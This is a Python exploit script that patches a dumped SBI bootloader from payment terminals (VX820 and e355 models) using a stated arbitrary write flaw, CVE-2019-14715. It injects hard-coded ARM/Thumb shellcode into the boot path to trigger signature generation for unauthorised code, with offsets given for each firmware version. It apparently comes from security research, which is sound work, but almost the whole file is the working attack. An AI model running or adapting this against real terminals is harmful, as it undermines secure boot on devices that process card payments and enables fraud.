#!/usr/bin/python
import sys, struct

# This file takes an SBI binary that has been dumped from the terminal's memory/NAND.
# It transforms it to create a patched SBI binary that can be loaded onto
# the terminal using XDL and executed, by abusing an arbitrary write vulnerability
# in SBI (CVE-2019-14715).

# The patched SBI binary performs the following:
#  - Execute normally: load and authenticate the VXOS kernel image
#  - Insert call to patch1() before jumping into the loaded kernel @ 0x40000000
#  - patch1(): insert a call to patch2() at 0x40000XXX in the decompression
#      routine, after decompression and before the jump into the decompressed code
#  - patch2(): insert a call to auth_and_generate_sig_file() at the end of
#     initialize()

# This needs offsets per SBI/OS version combo (see if/elifs below)

SBI_VERSION = "03_10" # "03_04"
OS_VERSION = "QT000500" # "QTE50301"

if len(sys.argv) != 3:
	print(f"ERROR: Invalid number of arguments: {len(sys.argv)}")
	sys.exit(1)

def patch(buf, idx, patch_buf):
	patch_len = len(patch_buf)
	if idx + patch_len > len(buf):
		print("Warning: patching outside of existing buffer")
	buf[idx:idx+patch_len] = patch_buf


sbi_original_filename = sys.argv[1]
sbi_patched_filename = sys.argv[2]

sbi_original_file = open(sbi_original_filename, "rb")
sbi_patched_file = open(sbi_patched_filename, "wb")

sbi_original = sbi_original_file.read()
sbi_patched = bytearray()
sbi_patched[:] = sbi_original[:0x14a20] # deep copy, cutting off any unrelated dump contents


# Add header to make it loadable in this recovery mode
sbi_load_addr = 0x001897f8
patch(sbi_patched, 0x00000000, b'\x8f\xc3\x9b\xa1') # magic
patch(sbi_patched, 0x00000010, b'\x04') # some flag that's needed
patch(sbi_patched, 0x00000018, struct.pack("<I", sbi_load_addr))


# most of my VX820 devices except #2
if SBI_VERSION == "03_04" and OS_VERSION == "QT000500":
	# Address of prompt_mode() and before it write_nand() which are unused in the normal flow
	# so we use it as scratch area for our first stage
	scratch_area_addr = 0x0018da8e

	# SBI: insert call to scratch area payload in jump_to_os()
	patch(sbi_patched, 0x00192afa - sbi_load_addr, b'\x00'*2) # nops
	patch(sbi_patched, 0x00192b06 - sbi_load_addr, b'\x00'*2) # nops
	patch(sbi_patched, 0x00192b08 - sbi_load_addr, b'\xfa\xf7\xc1\xff') # call to payload
	patch(sbi_patched, 0x00192b0c - sbi_load_addr, b'\x00'*4) # nops

	# SBI: overwrite prompt_mode() with our code
	#   This comes from shellcode_thumb.c.
	patch1_buf = b"\x00\x00\x00\x00\x0c\x00\x9f\xe5\x30\xff\x2f\xe1\x00\x00\x00\x00\x01\x01\xa0\xe3\x30\xff\x2f\xe1\x00\x00\x50\x40\x00\x00\x00\x00\x10\xd0\x4d\xe2\x5c\x30\x9f\xe5\x08\x30\x8d\xe5\x58\x30\x9f\xe5\x04\x30\x8d\xe5\x00\x30\xa0\xe3\x0c\x30\x8d\xe5\x0a\x00\x00\xea\x0c\x30\x9d\xe5\x04\x20\x9d\xe5\x03\x20\x82\xe0\x0c\x30\x9d\xe5\x08\x10\x9d\xe5\x03\x30\x81\xe0\x00\x20\xd2\xe5\x00\x20\xc3\xe5\x0c\x30\x9d\xe5\x01\x30\x83\xe2\x0c\x30\x8d\xe5\x0c\x30\x9d\xe5\x14\x00\x53\xe3\xf1\xff\xff\xda\x00\x00\xa0\xe1\x00\x00\xa0\xe1\x10\xd0\x8d\xe2\x1e\xff\x2f\xe1\x34\x75\x00\x40\x00\x00\x51\x40\x00\x00\x00\x00\x00\x00\x8f\xe2\xe6\x1d\x00\xeb\x2f\x31\x3a\x49\x55\x4f\x2e\x48\x00\x00\x00\x54\x00\x00\x84\xb0\x1f\x4b\x00\x93\x00\x23\x03\x93\x0b\xe0\x03\x9b\x00\x9a\xd3\x18\x1c\x49\x79\x44\x03\x9a\x8a\x18\x12\x78\x1a\x70\x03\x9b\x01\x33\x03\x93\x03\x9b\x1b\x2b\xf0\xdd\x17\x4b\x00\x93\x00\x23\x02\x93\x0b\xe0\x02\x9b\x00\x9a\xd3\x18\x14\x49\x79\x44\x02\x9a\x8a\x18\x12\x78\x1a\x70\x02\x9b\x01\x33\x02\x93\x02\x9b\x6f\x2b\xf0\xdd\x0f\x4b\x00\x93\x00\x23\x01\x93\x0b\xe0\x01\x9b\x00\x9a\xd3\x18\x0c\x49\x79\x44\x01\x9a\x8a\x18\x12\x78\x1a\x70\x01\x9b\x01\x33\x01\x93\x01\x9b\x13\x2b\xf0\xdd\xc0\x46\xc0\x46\x04\xb0\x70\x47\xb4\x01\x00\x40\x3e\xff\xff\xff\x00\x00\x50\x40\x36\xff\xff\xff\x00\x00\x51\x40\x82\xff\xff\xff"
	patch1_addr = scratch_area_addr - 0xaa # (room for the bufs in previous unused func)

# e355 device
elif SBI_VERSION == "03_10" and OS_VERSION == "QTE50301":
	# prompt_mode() is actually at 0x0018de14 in 03_10, but to keep it simple, we pick te same rough area (unused NAND write code before it anyway)
	scratch_area_addr = 0x0018da8e

	# SBI: insert call to scratch area payload in jump_to_os()
	patch(sbi_patched, 0x00193372 - sbi_load_addr, b'\x00'*2) # nops
	patch(sbi_patched, 0x0019337e - sbi_load_addr, b'\x00'*2) # nops
	patch(sbi_patched, 0x00193380 - sbi_load_addr, b'\xfa\xf7\x85\xfb') # call to payload
	patch(sbi_patched, 0x00193384 - sbi_load_addr, b'\x00'*4) # nops

	# SBI: overwrite prompt_mode() with our code
	#   This comes from shellcode_thumb.c.
	patch1_buf = b"\x00\x00\x00\x00\x0c\x00\x9f\xe5\x30\xff\x2f\xe1\x00\x00\x00\x00\x01\x01\xa0\xe3\x30\xff\x2f\xe1\x00\x00\x50\x40\x00\x00\x00\x00\x10\xd0\x4d\xe2\x5c\x30\x9f\xe5\x08\x30\x8d\xe5\x58\x30\x9f\xe5\x04\x30\x8d\xe5\x00\x30\xa0\xe3\x0c\x30\x8d\xe5\x0a\x00\x00\xea\x0c\x30\x9d\xe5\x04\x20\x9d\xe5\x03\x20\x82\xe0\x0c\x30\x9d\xe5\x08\x10\x9d\xe5\x03\x30\x81\xe0\x00\x20\xd2\xe5\x00\x20\xc3\xe5\x0c\x30\x9d\xe5\x01\x30\x83\xe2\x0c\x30\x8d\xe5\x0c\x30\x9d\xe5\x14\x00\x53\xe3\xf1\xff\xff\xda\x00\x00\xa0\xe1\x00\x00\xa0\xe1\x10\xd0\x8d\xe2\x1e\xff\x2f\xe1\x70\x4b\x00\x40\x00\x00\x51\x40\x00\x00\x00\x00\x00\x00\x8f\xe2\x45\x1a\x00\xeb\x2f\x31\x3a\x49\x55\x4f\x2e\x48\x00\x00\x00\x54\x00\x00\x84\xb0\x1f\x4b\x00\x93\x00\x23\x03\x93\x0b\xe0\x03\x9b\x00\x9a\xd3\x18\x1c\x49\x79\x44\x03\x9a\x8a\x18\x12\x78\x1a\x70\x03\x9b\x01\x33\x03\x93\x03\x9b\x1b\x2b\xf0\xdd\x17\x4b\x00\x93\x00\x23\x02\x93\x0b\xe0\x02\x9b\x00\x9a\xd3\x18\x14\x49\x79\x44\x02\x9a\x8a\x18\x12\x78\x1a\x70\x02\x9b\x01\x33\x02\x93\x02\x9b\x6f\x2b\xf0\xdd\x0f\x4b\x00\x93\x00\x23\x01\x93\x0b\xe0\x01\x9b\x00\x9a\xd3\x18\x0c\x49\x79\x44\x01\x9a\x8a\x18\x12\x78\x1a\x70\x01\x9b\x01\x33\x01\x93\x01\x9b\x13\x2b\xf0\xdd\xc0\x46\xc0\x46\x04\xb0\x70\x47\xb4\x01\x00\x40\x3e\xff\xff\xff\x00\x00\x50\x40\x36\xff\xff\xff\x00\x00\x51\x40\x82\xff\xff\xff"
	patch1_addr = scratch_area_addr - 0xaa # (room for the bufs in previous unused func)

# VX820 device #2
elif SBI_VERSION == "03_10" and OS_VERSION == "QT000500":
	# prompt_mode() is actually at 0x0018de14 in 03_10, but to keep it simple, we pick te same rough area (unused NAND write code before it anyway)
	scratch_area_addr = 0x0018da8e

	# SBI: insert call to scratch area payload in jump_to_os()
	patch(sbi_patched, 0x00193372 - sbi_load_addr, b'\x00'*2) # nops
	patch(sbi_patched, 0x0019337e - sbi_load_addr, b'\x00'*2) # nops
	patch(sbi_patched, 0x00193380 - sbi_load_addr, b'\xfa\xf7\x85\xfb') # call to payload
	patch(sbi_patched, 0x00193384 - sbi_load_addr, b'\x00'*4) # nops

	# SBI: overwrite prompt_mode() with our code
	#   This comes from shellcode_thumb.c.
	patch1_buf = b"\x00\x00\x00\x00\x0c\x00\x9f\xe5\x30\xff\x2f\xe1\x00\x00\x00\x00\x01\x01\xa0\xe3\x30\xff\x2f\xe1\x00\x00\x50\x40\x00\x00\x00\x00\x10\xd0\x4d\xe2\x5c\x30\x9f\xe5\x08\x30\x8d\xe5\x58\x30\x9f\xe5\x04\x30\x8d\xe5\x00\x30\xa0\xe3\x0c\x30\x8d\xe5\x0a\x00\x00\xea\x0c\x30\x9d\xe5\x04\x20\x9d\xe5\x03\x20\x82\xe0\x0c\x30\x9d\xe5\x08\x10\x9d\xe5\x03\x30\x81\xe0\x00\x20\xd2\xe5\x00\x20\xc3\xe5\x0c\x30\x9d\xe5\x01\x30\x83\xe2\x0c\x30\x8d\xe5\x0c\x30\x9d\xe5\x14\x00\x53\xe3\xf1\xff\xff\xda\x00\x00\xa0\xe1\x00\x00\xa0\xe1\x10\xd0\x8d\xe2\x1e\xff\x2f\xe1\x34\x75\x00\x40\x00\x00\x51\x40\x00\x00\x00\x00\x00\x00\x8f\xe2\xe6\x1d\x00\xeb\x2f\x31\x3a\x49\x55\x4f\x2e\x48\x00\x00\x00\x54\x00\x00\x84\xb0\x1f\x4b\x00\x93\x00\x23\x03\x93\x0b\xe0\x03\x9b\x00\x9a\xd3\x18\x1c\x49\x79\x44\x03\x9a\x8a\x18\x12\x78\x1a\x70\x03\x9b\x01\x33\x03\x93\x03\x9b\x1b\x2b\xf0\xdd\x17\x4b\x00\x93\x00\x23\x02\x93\x0b\xe0\x02\x9b\x00\x9a\xd3\x18\x14\x49\x79\x44\x02\x9a\x8a\x18\x12\x78\x1a\x70\x02\x9b\x01\x33\x02\x93\x02\x9b\x6f\x2b\xf0\xdd\x0f\x4b\x00\x93\x00\x23\x01\x93\x0b\xe0\x01\x9b\x00\x9a\xd3\x18\x0c\x49\x79\x44\x01\x9a\x8a\x18\x12\x78\x1a\x70\x01\x9b\x01\x33\x01\x93\x01\x9b\x13\x2b\xf0\xdd\xc0\x46\xc0\x46\x04\xb0\x70\x47\xb4\x01\x00\x40\x3e\xff\xff\xff\x00\x00\x50\x40\x36\xff\xff\xff\x00\x00\x51\x40\x82\xff\xff\xff"
	patch1_addr = scratch_area_addr - 0xaa # (room for the bufs in previous unused func)




patch(sbi_patched, patch1_addr - sbi_load_addr, patch1_buf)

# This should now continue booting, but execute patch2() (code and call to which is inside patch1_buf)

# Save output
sbi_patched_file.write(sbi_patched)
sbi_patched_file.close()

